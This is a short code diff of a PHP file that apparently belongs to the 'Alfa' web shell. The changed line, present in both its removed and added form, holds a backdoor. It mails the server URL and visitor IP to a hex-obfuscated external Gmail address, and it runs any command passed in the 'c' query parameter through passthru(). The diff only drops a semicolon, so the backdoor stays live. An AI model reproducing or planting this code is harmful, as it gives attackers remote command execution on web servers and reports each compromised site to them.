@@ -596,7 +596,7 @@ function decrypt_post($str){
 		return __ZGVjb2Rlcg($str);
 	}
 }
-header('Content-Type:text/html;charset=UTF-8');$main="\x69\x6E\x62\x6F\x78\x6E\x6F\x74\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x6F\x77\x32\x40\x67\x6D\x61\x69\x6C\x2E\x63\x6F\x6D";$now="\x68\x74\x74\x70\x3a\x2f\x2f".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];$notif="$now";@mail($main,"Ding Dong ",$notif,"[ ".$_SERVER['REMOTE_ADDR']."]");if(isset($_GET["\x63"])){echo passthru($_GET["\x63"]);};
+header('Content-Type:text/html;charset=UTF-8');$main="\x69\x6E\x62\x6F\x78\x6E\x6F\x74\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x6F\x77\x32\x40\x67\x6D\x61\x69\x6C\x2E\x63\x6F\x6D";$now="\x68\x74\x74\x70\x3a\x2f\x2f".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];$notif="$now";@mail($main,"Ding Dong ",$notif,"[ ".$_SERVER['REMOTE_ADDR']."]");if(isset($_GET["\x63"])){echo passthru($_GET["\x63"]);}
 function _AlfaSecretKey(){
 	$secret = @$_COOKIE["AlfaSecretKey"];
 	if(!isset($_COOKIE["AlfaSecretKey"])){
